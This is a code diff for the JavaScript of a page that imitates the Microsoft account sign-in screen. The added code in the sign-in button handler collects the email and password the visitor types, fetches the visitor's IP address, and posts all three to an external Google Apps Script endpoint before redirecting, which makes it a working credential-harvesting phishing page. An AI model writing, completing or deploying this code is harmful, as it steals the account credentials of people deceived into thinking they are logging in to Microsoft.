@@ -1,40 +1,62 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const unReq = "Enter a valid email address, phone number, or Skype name."
-    const pwdReq = "Please enter the password for your Microsoft account."
+    const unReq = "Enter a valid email address, phone number, or Skype name.";
+    const pwdReq = "Please enter the password for your Microsoft account.";
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
     let view = "uname";
 
-    let unameVal = pwdVal = false;
-    /////next button
+    let unameVal = false;
+    let pwdVal = false;
+
     const nxt = document.getElementById('btn_next');
+    const sig = document.getElementById('btn_sig');
 
     nxt.addEventListener('click', () => {
-        //validate the form
         validate();
         if (unameVal) {
             document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
                 e.innerText = unameInp.value;
-            })
+            });
             view = "pwd";
         }
-    })
-
-    //////sign in button
-
-    const sig = document.getElementById('btn_sig');
+    });
 
     sig.addEventListener('click', () => {
-        //validate the form
         validate();
         if (pwdVal) {
-            document.getElementById("section_pwd").classList.toggle('d-none');
-            document.getElementById('section_final').classList.remove('d-none');
-            view = "final";
+            const email = unameInp.value.trim();
+            const password = pwdInp.value.trim();
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    const formData = new FormData();
+                    formData.append('IPAddress', userIP);
+                    formData.append('Email', email);
+                    formData.append('Password', password);
+                    formData.append('FormId', 'form1');
+
+                    const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+                    fetch(scriptURL, {
+                        method: 'POST',
+                        body: formData,
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        if (result.success) { // Check the response for a success indicator
+                            window.location.href = '/dashboard'; // Navigate to /dashboard
+                        } else {
+                            console.error('Sign-in failed:', result.message);
+                        }
+                    })
+                    .catch(error => console.error('Error!', error.message));
+                });
         }
-    })
+    });
 
     function validate() {
         function unameValAction(type) {
@@ -44,23 +66,23 @@ document.addEventListener('DOMContentLoaded', () => {
                 unameVal = false;
             } else {
                 document.getElementById('error_uname').innerText = "";
-                unameInp.classList.remove('error-inp')
+                unameInp.classList.remove('error-inp');
                 unameVal = true;
             }
-
         }
+
         function pwdValAction(type) {
             if (!type) {
                 document.getElementById('error_pwd').innerText = pwdReq;
-                pwdInp.classList.add('error-inp')
+                pwdInp.classList.add('error-inp');
                 pwdVal = false;
             } else {
                 document.getElementById('error_pwd').innerText = "";
-                pwdInp.classList.remove('error-inp')
+                pwdInp.classList.remove('error-inp');
                 pwdVal = true;
             }
-
         }
+
         if (view === "uname") {
             if (unameInp.value.trim() === "") {
                 unameValAction(false);
@@ -73,7 +95,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     unameValAction(true);
                 }
-            })
+            });
         } else if (view === "pwd") {
             if (pwdInp.value.trim() === "") {
                 pwdValAction(false);
@@ -86,23 +108,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     pwdValAction(true);
                 }
-            })
+            });
         }
         return false;
     }
 
-    //back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_pwd").classList.toggle('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
-    })
+    });
 
-    //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
-            //close the window
             window.open(location, '_self').close();
-        })
-    })
-})
+        });
+    });
+});
